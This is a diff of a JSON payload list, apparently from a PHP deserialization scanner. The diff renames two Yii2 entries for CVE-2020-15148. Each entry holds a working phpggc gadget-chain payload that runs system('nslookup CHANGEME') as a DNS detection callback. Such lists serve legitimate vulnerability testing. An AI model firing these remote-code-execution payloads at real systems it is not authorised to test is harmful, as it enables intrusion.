@@ -193,13 +193,13 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Yii2 < 2.0.38 (CVE-2020-15148)",
+    "name": "Yii2 < 2.0.38 (CVE-2020-15148) (1)",
     "gen_with": "./phpggc Yii2/RCE1 <function> <parameter>",
     "payload": "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"yii\\db\\BatchQueryResult_dataReader\";O:17:\"yii\\db\\Connection\":2:{s:3:\"pdo\";i:1;s:3:\"dsn\";O:26:\"yii\\db\\ColumnSchemaBuilder\":2:{s:7:\"*type\";s:1:\"x\";s:11:\"categoryMap\";O:22:\"yii\\caching\\ArrayCache\":2:{s:10:\"serializer\";a:1:{i:1;s:6:\"system\";}s:30:\"yii\\caching\\ArrayCache_cache\";a:1:{s:1:\"x\";a:2:{i:0;s:72:\"nslookup CHANGEME\";i:1;i:0;}}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Yii2 < 2.0.38 (CVE-2020-15148) Alternative",
+    "name": "Yii2 < 2.0.38 (CVE-2020-15148) (2)",
     "gen_with": "./phpggc Yii2/RCE2 \"system('nslookup CHANGEME');\"",
     "payload": "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"%00yii\\db\\BatchQueryResult%00_dataReader\"%3BO:17:\"yii\\web\\DbSession\":1:{s:13:\"writeCallback\"%3Ba:2:{i:0%3BO:32:\"yii\\caching\\ExpressionDependency\":1:{s:10:\"expression\"%3Bs:83:\"system('nslookup CHANGEME')%3B\"%3B}i:1%3Bs:18:\"evaluateDependency\"%3B}}}"
   },
